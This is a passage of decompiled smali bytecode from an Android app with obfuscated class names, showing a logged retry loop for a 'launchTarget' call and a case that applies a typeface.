    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 663
    .line 664
    .line 665
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 666
    .line 667
    .line 668
    move-result-object v0

    .line 669
    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 670
    .line 671
    .line 672
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 673
    .line 674
    .line 675
    move-result-object v0

    .line 676
    invoke-static {v4, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 677
    .line 678
    .line 679
    :goto_c
    :try_start_10
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V
    :try_end_10
    .catch Ljava/lang/InterruptedException; {:try_start_10 .. :try_end_10} :catch_5

    .line 680
    .line 681
    .line 682
    add-int/lit8 v6, v6, 0x1

    .line 683
    .line 684
    goto :goto_a

    .line 685
    :cond_c
    new-instance v0, Ljava/lang/StringBuilder;

    .line 686
    .line 687
    const-string v2, "launchTarget: all 15 attempts failed for "

    .line 688
    .line 689
    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 690
    .line 691
    .line 692
    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 693
    .line 694
    .line 695
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 696
    .line 697
    .line 698
    move-result-object v0

    .line 699
    invoke-static {v4, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 700
    .line 701
    .line 702
    :catch_5
    :goto_d
    return-void

    .line 703
    :pswitch_2
    iget-object v0, v1, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->ECM0w2UpL85TD4rnc:Ljava/lang/Object;

    .line 704
    .line 705
    check-cast v0, LQH62hje1O4khQnco5y/ECM0w2UpL85TD4rnc;

    .line 706
    .line 707
    iget-object v2, v1, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->WAxAMT28akcO:Ljava/lang/Object;

    .line 708
    .line 709
    check-cast v2, Landroid/graphics/Typeface;

    .line 710
    .line 711
    invoke-virtual {v0, v2}, LQH62hje1O4khQnco5y/ECM0w2UpL85TD4rnc;->HrAWa37pvWeygr(Landroid/graphics/Typeface;)V

    .line 712
    .line 713
    .line 714
    return-void

    .line 715
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
